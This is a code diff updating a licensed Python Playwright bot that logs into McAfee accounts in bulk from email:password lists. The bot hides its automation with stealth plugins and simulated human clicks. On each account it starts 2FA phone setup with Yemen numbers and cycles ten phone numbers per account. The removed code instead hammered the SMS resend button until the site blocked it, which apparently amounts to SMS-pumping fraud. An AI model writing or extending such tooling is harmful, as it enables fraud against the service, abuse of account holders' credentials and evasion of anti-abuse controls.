@@ -14,8 +14,9 @@ file_lock = Lock()
 phone_numbers = []
 phone_index = 0
 phone_lock = Lock()
-reuse_phone = None  # Track if we need to reuse a phone number
-reuse_phone_lock = Lock()
+
+# Configuration
+NUMBERS_PER_ACCOUNT = 10  # Use 10 numbers for each account
 
 
 def clear_console():
@@ -28,30 +29,19 @@ def savecreated(filename, message):
         file.writelines(message + '\n')
 
 
-def get_next_phone():
-    """Get next phone number from the pool in a thread-safe manner"""
-    global phone_index, phone_numbers, phone_lock, reuse_phone, reuse_phone_lock
-
-    # Check if we need to reuse a phone number
-    with reuse_phone_lock:
-        if reuse_phone is not None:
-            phone = reuse_phone
-            reuse_phone = None  # Clear after use
-            return phone
+def get_next_phones(count):
+    """Get next N phone numbers from the pool in a thread-safe manner"""
+    global phone_index, phone_numbers, phone_lock
 
     with phone_lock:
-        if phone_index >= len(phone_numbers):
-            phone_index = 0  # Reset to beginning if we run out
-        phone = phone_numbers[phone_index]
-        phone_index += 1
-        return phone
-
-
-def set_reuse_phone(phone):
-    """Set a phone number to be reused for the next account"""
-    global reuse_phone, reuse_phone_lock
-    with reuse_phone_lock:
-        reuse_phone = phone
+        phones = []
+        for _ in range(count):
+            if phone_index >= len(phone_numbers):
+                phone_index = 0  # Reset to beginning if we run out
+            if len(phone_numbers) > 0:
+                phones.append(phone_numbers[phone_index])
+                phone_index += 1
+        return phones
 
 
 def remove_phone_from_file(phone):
@@ -64,7 +54,7 @@ def remove_phone_from_file(phone):
                 for line in lines:
                     if line.strip() != phone:
                         file.write(line)
-            logger.info(f"Removed phone {phone} from numbers.txt (exhausted)")
+            logger.info(f"Removed phone {phone} from numbers.txt")
     except Exception as e:
         logger.error(f"Error removing phone from file: {e}")
 
@@ -89,15 +79,15 @@ def human_like_click(page, locator):
         locator.click()
 
 
-def mcafee_login_automation(email, password, phone_number, runner_id, progress_bar):
+def mcafee_login_automation(email, password, phone_numbers_list, runner_id, progress_bar):
     """
-    Automates McAfee login and 2FA setup process
+    Automates McAfee login and 2FA setup process with 10 numbers
     """
-    url = "https://home.mcafee.com/Secure/Protected/MyAccountInfo.aspx?culture=en-us&affid=0&mfa=HM91lGej3PslkEIZQpuGf0O1BGsdfKEMtIjuQAdDnLM1"
+    url = "https://myaccount.mcafee.com/v2/profile/en-us/0"
 
     with sync_playwright() as playwright:
         try:
-            browser = playwright.chromium.launch(headless=True)  # Headless mode - no visible browser
+            browser = playwright.chromium.launch(headless=True)  # Set to False for visible browser
             context = browser.new_context()
             stealth_sync(context)
             page = context.new_page()
@@ -119,15 +109,15 @@ def mcafee_login_automation(email, password, phone_number, runner_id, progress_b
             password_input.fill(password)
             time.sleep(1)
 
-            # Step 3: Click sign in button (human-like) - Fast retry mechanism
-            logger.info(f"{runner_id}: Clicking sign in button (first click)...")
+            # Step 3: Click sign in button (human-like)
+            logger.info(f"{runner_id}: Clicking sign in button...")
             sign_in_button = page.locator('button#sign-in-button[aria-label="Sign in"]')
             sign_in_button.wait_for(state="visible", timeout=5000)
             time.sleep(random.uniform(0.5, 1.5))
             human_like_click(page, sign_in_button)
 
             # Wait 11 seconds for sign-in button to reappear
-            logger.info(f"{runner_id}: Waiting 11 seconds for sign-in button to reappear...")
+            logger.info(f"{runner_id}: Waiting 11 seconds...")
             time.sleep(11)
 
             # Check if sign-in button appeared again and click it
@@ -137,17 +127,15 @@ def mcafee_login_automation(email, password, phone_number, runner_id, progress_b
                     time.sleep(random.uniform(0.5, 1.5))
                     human_like_click(page, sign_in_button)
                     time.sleep(2)
-                else:
-                    logger.info(f"{runner_id}: Sign-in button did not reappear, continuing...")
             except:
-                logger.info(f"{runner_id}: Sign-in button did not reappear, continuing...")
+                pass
 
             # Check for login error
             try:
                 login_error = page.locator('div#login-error-id[data-testid="error-div"]')
                 if login_error.is_visible(timeout=2000):
                     logger.error(f"{runner_id}: Login failed - Invalid credentials")
-                    savecreated('failed', f"{email}:{password} - Login error: Invalid credentials")
+                    savecreated('failed', f"{email}:{password} - Invalid credentials")
                     browser.close()
                     if progress_bar:
                         progress_bar.update(1)
@@ -155,130 +143,116 @@ def mcafee_login_automation(email, password, phone_number, runner_id, progress_b
             except:
                 pass
 
-            # Step 4: NOW search for Enable 2FA button (only after second click attempt)
-            logger.info(f"{runner_id}: Now searching for Enable 2FA button...")
-            enable_2fa_button = page.locator('a#ctl00_MainContent_ctl00_m_EnableTwoFactorButtonLabel')
+            # Step 4: Search for Enable 2FA button
+            logger.info(f"{runner_id}: Searching for Enable 2FA button...")
+            enable_2fa_button = page.locator('button.pgs-button.pgs-button--secondary.pgs-button--md.pgs-button__width--normal.pgs-button__shape--pill.mr-8.mt-24.fs-unmask')
             enable_2fa_button.wait_for(state="visible", timeout=15000)
             logger.success(f"{runner_id}: Enable 2FA button found!")
             enable_2fa_button.click()
             time.sleep(3)
 
-            # Step 5: Change country from Egypt to Kenya
-            logger.info(f"{runner_id}: Changing country to Kenya...")
-            # Click on country selector button
+            # Step 5: Change country to Yemen
+            logger.info(f"{runner_id}: Changing country to Yemen...")
             country_button = page.locator('button[name="action"][value="pick-country-code"]')
             country_button.wait_for(state="visible", timeout=15000)
             country_button.click()
             time.sleep(2)
 
-            # Search for Kenya
-            logger.info(f"{runner_id}: Searching for Kenya...")
+            logger.info(f"{runner_id}: Searching for Yemen...")
             search_input = page.locator('input[type="search"][name="with-search"]')
             search_input.wait_for(state="visible", timeout=10000)
-            search_input.fill("kenya")
+            search_input.fill("yemen")
             time.sleep(2)
 
-            # Click on Kenya option
-            logger.info(f"{runner_id}: Selecting Kenya...")
-            kenya_option = page.locator('span:has-text("Kenya (+254)")')
-            kenya_option.first.click()
+            logger.info(f"{runner_id}: Selecting Yemen...")
+            yemen_option = page.locator('span:has-text("Yemen (+967)")')
+            yemen_option.first.click()
             time.sleep(2)
 
-            # Step 6: Enter phone number
-            logger.info(f"{runner_id}: Entering phone number...")
-            phone_input = page.locator('input[name="phone"][type="text"]')
-            phone_input.wait_for(state="visible", timeout=10000)
-            phone_input.fill(phone_number)
-            time.sleep(1)
+            # Step 6: Use 10 numbers with Edit button approach
+            logger.info(f"{runner_id}: Starting 10-number cycle...")
 
-            # Step 7: Click continue button
-            logger.info(f"{runner_id}: Clicking continue...")
-            continue_button = page.locator('button[name="action"][value="default"][data-action-button-primary="true"]')
-            continue_button.click()
-            time.sleep(3)
+            for attempt_num, phone_number in enumerate(phone_numbers_list[:NUMBERS_PER_ACCOUNT], 1):
+                logger.info(f"{runner_id}: Attempt {attempt_num}/10 - Using phone {phone_number}")
 
-            # Check for IMMEDIATE alert (phone already blocked)
-            try:
-                immediate_alert = page.locator('div#prompt-alert[data-error-code="too-many-sms"]')
-                if immediate_alert.is_visible(timeout=2000):
-                    logger.warning(f"{runner_id}: Phone {phone_number} already blocked! Saving to max.txt")
-                    savecreated('max', f"{email}:{password}:{phone_number} - Phone already blocked")
-                    set_reuse_phone(phone_number)  # Reuse this phone for next account
+                # Enter phone number
+                phone_input = page.locator('input[name="phone"][type="text"]')
+                phone_input.wait_for(state="visible", timeout=10000)
+
+                # Clear existing value and enter new number
+                phone_input.fill("")  # Clear first
+                time.sleep(0.5)
+                phone_input.fill(phone_number)
+                time.sleep(1)
+
+                # Click continue button
+                logger.info(f"{runner_id}: Clicking continue...")
+                continue_button = page.locator('button[name="action"][value="default"][data-action-button-primary="true"]')
+                continue_button.click()
+                time.sleep(3)
+
+                # Check for immediate block alert
+                try:
+                    immediate_alert = page.locator('div#prompt-alert[data-error-code="too-many-sms"]')
+                    if immediate_alert.is_visible(timeout=2000):
+                        logger.warning(f"{runner_id}: Phone {phone_number} already blocked!")
+                        # Remove this number and continue to next
+                        remove_phone_from_file(phone_number)
+
+                        # If this was the last attempt, save to completed
+                        if attempt_num == NUMBERS_PER_ACCOUNT:
+                            logger.success(f"{runner_id}: Account DONE - Completed 10 attempts")
+                            all_phones = ":".join(phone_numbers_list[:NUMBERS_PER_ACCOUNT])
+                            savecreated('completed', f"{email}:{password}:{all_phones}")
+                            browser.close()
+                            if progress_bar:
+                                progress_bar.update(1)
+                            return
+
+                        # Click Edit button to try next number
+                        time.sleep(1)
+                        edit_button = page.locator('a.ceef21d30.ce025ff9f.cc6e2a95c.c4a61485b[aria-label="Edit phone number"]')
+                        if edit_button.is_visible(timeout=2000):
+                            edit_button.click()
+                            time.sleep(2)
+                            continue
+                except:
+                    pass
+
+                # Remove the used number from file
+                remove_phone_from_file(phone_number)
+
+                # Check if we've completed all 10 attempts
+                if attempt_num == NUMBERS_PER_ACCOUNT:
+                    logger.success(f"{runner_id}: Account DONE - Completed 10 attempts")
+                    all_phones = ":".join(phone_numbers_list[:NUMBERS_PER_ACCOUNT])
+                    savecreated('completed', f"{email}:{password}:{all_phones}")
                     browser.close()
                     if progress_bar:
                         progress_bar.update(1)
                     return
-            except:
-                pass
 
-            time.sleep(2)
+                # Click Edit button for next number
+                time.sleep(2)
+                logger.info(f"{runner_id}: Clicking Edit button for next number...")
+                edit_button = page.locator('a.ceef21d30.ce025ff9f.cc6e2a95c.c4a61485b[aria-label="Edit phone number"]')
 
-            # Step 8: Keep clicking resend until max attempts message appears
-            logger.info(f"{runner_id}: Working on account, clicking resend until blocked...")
-            resend_count = 0
-            max_resends = 100  # Safety limit
-
-            while resend_count < max_resends:
-                # Check if max attempts message is visible FIRST (two possible locations)
-                try:
-                    # Check for paragraph message
-                    max_attempts_msg = page.locator('p:has-text("You\'ve reached the maximum number of resend attempts")')
-                    if max_attempts_msg.is_visible(timeout=1000):
-                        logger.success(f"{runner_id}: Account DONE (max resend attempts reached after {resend_count} resends)")
-                        savecreated('completed', f"{email}:{password}:{phone_number}")
-
-                        # If we successfully resent multiple times, remove phone from file (it's exhausted)
-                        if resend_count >= 5:
-                            remove_phone_from_file(phone_number)
-
-                        browser.close()
-                        if progress_bar:
-                            progress_bar.update(1)
-                        return  # Exit immediately and move to next account
-                except:
-                    pass
-
-                # Also check for alert div with id="prompt-alert"
-                try:
-                    alert_div = page.locator('div#prompt-alert[data-error-code="too-many-sms"]')
-                    if alert_div.is_visible(timeout=1000):
-                        logger.success(f"{runner_id}: Account DONE (alert detected after {resend_count} resends)")
-                        savecreated('completed', f"{email}:{password}:{phone_number}")
-
-                        # If we successfully resent multiple times, remove phone from file (it's exhausted)
-                        if resend_count >= 5:
-                            remove_phone_from_file(phone_number)
-
-                        browser.close()
-                        if progress_bar:
-                            progress_bar.update(1)
-                        return  # Exit immediately and move to next account
-                except:
-                    pass
-
-                # Click resend button (silently, no spam logs)
-                try:
-                    resend_button = page.locator('button[name="action"][value="resend-code"]')
-                    if resend_button.is_visible(timeout=3000):
-                        resend_button.click()
-                        resend_count += 1
-                        time.sleep(2)
-                    else:
-                        logger.warning(f"{runner_id}: Resend button not found")
-                        break
-                except Exception as e:
-                    logger.warning(f"{runner_id}: Error clicking resend: {e}")
+                if edit_button.is_visible(timeout=3000):
+                    edit_button.click()
                     time.sleep(2)
+                else:
+                    logger.warning(f"{runner_id}: Edit button not found")
+                    break
 
-            logger.success(f"{runner_id}: Automation completed successfully!")
-            time.sleep(3)
+            logger.success(f"{runner_id}: Automation completed!")
             browser.close()
             if progress_bar:
                 progress_bar.update(1)
 
         except Exception as e:
             logger.error(f"{runner_id}: Automation failed - {e}")
-            savecreated('failed', f"{email}:{password}:{phone_number} - Error: {str(e)}")
+            phones_str = ":".join(phone_numbers_list[:NUMBERS_PER_ACCOUNT]) if phone_numbers_list else "no_phones"
+            savecreated('failed', f"{email}:{password}:{phones_str} - Error: {str(e)}")
             try:
                 browser.close()
             except:
@@ -293,10 +267,18 @@ def run_worker(index, account_data, progress_bar):
     """
     runner_id = f"Worker-{index + 1}"
     email, password = account_data.split(':', 1)
-    phone = get_next_phone()  # Get next phone from pool
 
-    logger.info(f"{runner_id}: Starting automation for {email} with phone {phone}")
-    mcafee_login_automation(email, password, phone, runner_id, progress_bar)
+    # Get 10 phone numbers for this account
+    phones = get_next_phones(NUMBERS_PER_ACCOUNT)
+
+    if len(phones) < NUMBERS_PER_ACCOUNT:
+        logger.warning(f"{runner_id}: Not enough phone numbers available (need {NUMBERS_PER_ACCOUNT}, got {len(phones)})")
+        if progress_bar:
+            progress_bar.update(1)
+        return
+
+    logger.info(f"{runner_id}: Starting automation for {email} with {len(phones)} phone numbers")
+    mcafee_login_automation(email, password, phones, runner_id, progress_bar)
 
 
 if __name__ == "__main__":
@@ -304,7 +286,7 @@ if __name__ == "__main__":
 
     # ===== LICENSE CHECK =====
     print("=" * 60)
-    print("McAfee Login Automation Script")
+    print("McAfee Login Automation Script - V3")
     print("=" * 60)
     print()
 
@@ -353,9 +335,10 @@ if __name__ == "__main__":
             exit(1)
 
     # License is valid, continue
-    logger.info("McAfee Login Automation Script")
+    logger.info("McAfee Login Automation Script - V3")
     logger.info("=" * 50)
     logger.info("✅ License: ACTIVE")
+    logger.info(f"Using {NUMBERS_PER_ACCOUNT} numbers per account")
 
     # Load accounts from file (format: email:password)
     try:
@@ -375,9 +358,17 @@ if __name__ == "__main__":
         logger.error("'numbers.txt' not found. Create a file with phone numbers (one per line)")
         exit(1)
 
-    if len(phone_numbers) == 0:
-        logger.error("No phone numbers loaded. Please add numbers to numbers.txt")
+    if len(phone_numbers) < NUMBERS_PER_ACCOUNT:
+        logger.error(f"Not enough phone numbers! Need at least {NUMBERS_PER_ACCOUNT} numbers, found {len(phone_numbers)}")
         exit(1)
+
+    # Calculate how many accounts can be processed
+    max_accounts = len(phone_numbers) // NUMBERS_PER_ACCOUNT
+    logger.info(f"Can process up to {max_accounts} accounts with available phone numbers")
+
+    if len(accounts) > max_accounts:
+        logger.warning(f"Note: Only {max_accounts} accounts will be processed (limited by phone numbers)")
+        accounts = accounts[:max_accounts]
 
     # Ask for number of workers
     num_workers = int(input('Number of concurrent workers: '))
